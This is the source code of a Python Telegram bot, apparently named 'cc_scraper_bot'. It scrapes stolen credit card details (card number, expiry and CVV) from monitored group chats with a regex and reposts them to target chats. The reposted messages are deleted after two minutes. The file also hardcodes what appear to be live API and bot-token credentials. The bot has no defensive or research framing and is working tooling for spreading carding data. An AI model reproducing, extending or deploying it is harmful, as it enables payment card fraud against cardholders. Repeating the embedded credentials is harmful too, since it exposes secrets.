import re
import asyncio
import logging
import json
import os
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ParseMode, ChatType
from pyrogram.errors import PeerIdInvalid, ChatAdminRequired

# Configuration
API_ID = 28232616
API_HASH = "82e6373f14a917289086553eefc64afe"
BOT_TOKEN = "7673804034:AAFU7Wh8ejap55mwTiqV-2OwFLldRJ_xp8o"
ADMIN_ID = 5387926427  # Only this user can use admin commands

# Data storage
SOURCE_CHATS = []
TARGET_CHATS = []
SOURCE_CHATS_FILE = "source_chats.json"
TARGET_CHATS_FILE = "target_chats.json"

if os.path.exists(SOURCE_CHATS_FILE):
    with open(SOURCE_CHATS_FILE, "r") as f:
        SOURCE_CHATS = json.load(f)

if os.path.exists(TARGET_CHATS_FILE):
    with open(TARGET_CHATS_FILE, "r") as f:
        TARGET_CHATS = json.load(f)

WELCOME_IMAGE_URL = "https://cdn.nekos.life/neko/neko370.jpeg"
SUPPORT_USERNAME = "@approvedccm_bot"

logging.basicConfig(level=logging.INFO, filename="bot.log", filemode="a")

app = Client("cc_scraper_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

def save_source_chats():
    with open(SOURCE_CHATS_FILE, "w") as f:
        json.dump(SOURCE_CHATS, f)

def save_target_chats():
    with open(TARGET_CHATS_FILE, "w") as f:
        json.dump(TARGET_CHATS, f)

def extract_credit_cards(text):
    pattern = r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})'
    return re.findall(pattern, text or "")

def format_card_message(cc):
    card_number, month, year, cvv = cc
    return f"<code>{card_number}|{month}|{year}|{cvv}</code>"

async def delete_after_delay(message):
    await asyncio.sleep(120)
    try:
        await message.delete()
    except Exception as e:
        logging.warning(f"Error deleting message: {e}")

@app.on_message(filters.command("start") & filters.private)
async def start(client, message: Message):
    welcome_message = f"""✅ Welcome to @{(await client.get_me()).username}!
Add me to your group as an admin to start.

For any issues, contact: {SUPPORT_USERNAME}"""

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add to Group", url=f"https://t.me/{(await client.get_me()).username}?startgroup=true")],
        [InlineKeyboardButton("📥 Get Group ID", callback_data="show_chat_id")]
    ])
    
    try:
        await message.reply_photo(
            photo=WELCOME_IMAGE_URL,
            caption=welcome_message,
            reply_markup=keyboard,
            parse_mode=ParseMode.HTML
        )
    except Exception:
        await message.reply(
            welcome_message,
            reply_markup=keyboard,
            parse_mode=ParseMode.HTML
        )

@app.on_message(filters.command("admin"))
async def admin_commands(client, message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    admin_help = """🛠 <b>Admin Commands:</b>

/add_source [chat_id] - Add source chat
/add_target [chat_id] - Add target chat
/remove_source [chat_id] - Remove source chat
/remove_target [chat_id] - Remove target chat
/list_chats - List all monitored chats
/contact [user_id] [message] - Contact user"""

    await message.reply(admin_help, parse_mode=ParseMode.HTML)

@app.on_message(filters.command("id") & (filters.group | filters.channel))
async def get_id(client, message: Message):
    response = f"<code>{message.chat.id}</code>"
    await message.reply(response, parse_mode=ParseMode.HTML)

@app.on_message(filters.private & ~filters.user(ADMIN_ID))
async def handle_chat_id_submission(client, message: Message):
    if message.text and message.text.startswith("/"):
        return

    try:
        chat_id = int(message.text.strip())
        chat = await client.get_chat(chat_id)
        
        if chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
            try:
                member = await client.get_chat_member(chat_id, "me")
                if not member.privileges:
                    await message.reply("⚠️ Please make me admin in the group first.")
                    return
            except Exception as e:
                await message.reply(f"⚠️ I'm not in that group or not admin. Error: {str(e)}")
                return
        
        # Add directly to source and target chats without approval
        if chat_id not in SOURCE_CHATS:
            SOURCE_CHATS.append(chat_id)
            save_source_chats()
        if chat_id not in TARGET_CHATS:
            TARGET_CHATS.append(chat_id)
            save_target_chats()
        
        # Send confirmation to user
        await message.reply(
            "👥 Please follow these steps:\n\n"
            "1. Add me to your group\n"
            "2. Make me an admin\n"
            "3. Send me the Group ID here (just paste it in this chat)\n"
            "4. (Optional) Provide the channel link for verification\n\n"
            "To get your Group ID, go to your group and send the /id command, then copy the ID and send it here.\n\n"
            f"For any issues, contact: {SUPPORT_USERNAME}",
            parse_mode=ParseMode.HTML
        )
        
        # Notify admin
        await client.send_message(
            ADMIN_ID,
            f"📩 New Group Submission:\n"
            f"👤 From: @{message.from_user.username or message.from_user.id}\n"
            f"🆔 ID: <code>{chat.id}</code>\n"
            f"📊 Source Groups: {len(SOURCE_CHATS)}\n"
            f"📊 Target Groups: {len(TARGET_CHATS)}",
            parse_mode=ParseMode.HTML
        )
        
    except ValueError:
        await message.reply("⚠️ Please send only the numeric Group ID")
    except Exception as e:
        await message.reply(f"⚠️ Error processing your submission: {str(e)}")

@app.on_message(filters.command("contact") & filters.user(ADMIN_ID))
async def contact_user(client, message: Message):
    if len(message.command) < 3:
        await message.reply("❌ Usage: /contact <user_id> <message>")
        return
    
    try:
        user_id = int(message.command[1])
        msg_text = " ".join(message.command[2:])
        
        await client.send_message(user_id, f"📢 Admin Message:\n{msg_text}\n\nFor any issues, contact: {SUPPORT_USERNAME}")
        await message.reply("✅ Message sent successfully!")
    except ValueError:
        await message.reply("❌ Invalid user ID. Please provide a numeric ID.")
    except Exception as e:
        await message.reply(f"❌ Failed to send message: {str(e)}")

@app.on_message(filters.chat(SOURCE_CHATS))
async def scrape_credit_cards(client, message: Message):
    try:
        text = message.text or message.caption
        if not text:
            return
            
        cards = extract_credit_cards(text)
        if not cards:
            return
            
        for card in cards:
            card_msg = format_card_message(card)
            for target in TARGET_CHATS:
                try:
                    sent = await client.send_message(
                        target,
                        card_msg,
                        parse_mode=ParseMode.HTML
                    )
                    asyncio.create_task(delete_after_delay(sent))
                except Exception as e:
                    logging.error(f"Error sending to {target}: {e}")
                    
    except Exception as e:
        logging.error(f"Error processing message: {e}")

@app.on_message(filters.command("add_source") & filters.user(ADMIN_ID))
async def add_source_chat(client, message: Message):
    try:
        chat_id = int(message.command[1])
        if chat_id not in SOURCE_CHATS:
            SOURCE_CHATS.append(chat_id)
            save_source_chats()
            await message.reply(f"✅ Added {chat_id} to source chats.")
        else:
            await message.reply(f"ℹ️ {chat_id} is already in source chats.")
    except (IndexError, ValueError):
        await message.reply("❌ Usage: /add_source <chat_id>")
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")

@app.on_message(filters.command("add_target") & filters.user(ADMIN_ID))
async def add_target_chat(client, message: Message):
    try:
        chat_id = int(message.command[1])
        if chat_id not in TARGET_CHATS:
            TARGET_CHATS.append(chat_id)
            save_target_chats()
            await message.reply(f"✅ Added {chat_id} to target chats.")
        else:
            await message.reply(f"ℹ️ {chat_id} is already in target chats.")
    except (IndexError, ValueError):
        await message.reply("❌ Usage: /add_target <chat_id>")
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")

@app.on_message(filters.command("list_chats") & filters.user(ADMIN_ID))
async def list_chats(client, message: Message):
    source_list = "\n".join(str(chat) for chat in SOURCE_CHATS)
    target_list = "\n".join(str(chat) for chat in TARGET_CHATS)
    
    response = (
        f"📋 <b>Source Chats</b> (monitored for CCs):\n{source_list or 'None'}\n\n"
        f"🎯 <b>Target Chats</b> (where CCs are sent):\n{target_list or 'None'}"
    )
    
    await message.reply(response, parse_mode=ParseMode.HTML)

@app.on_message(filters.command("remove_source") & filters.user(ADMIN_ID))
async def remove_source_chat(client, message: Message):
    try:
        chat_id = int(message.command[1])
        if chat_id in SOURCE_CHATS:
            SOURCE_CHATS.remove(chat_id)
            save_source_chats()
            await message.reply(f"✅ Removed {chat_id} from source chats.")
        else:
            await message.reply(f"ℹ️ {chat_id} not found in source chats.")
    except (IndexError, ValueError):
        await message.reply("❌ Usage: /remove_source <chat_id>")
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")

@app.on_message(filters.command("remove_target") & filters.user(ADMIN_ID))
async def remove_target_chat(client, message: Message):
    try:
        chat_id = int(message.command[1])
        if chat_id in TARGET_CHATS:
            TARGET_CHATS.remove(chat_id)
            save_target_chats()
            await message.reply(f"✅ Removed {chat_id} from target chats.")
        else:
            await message.reply(f"ℹ️ {chat_id} not found in target chats.")
    except (IndexError, ValueError):
        await message.reply("❌ Usage: /remove_target <chat_id>")
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")

print("✅ Bot is running...")
app.run()
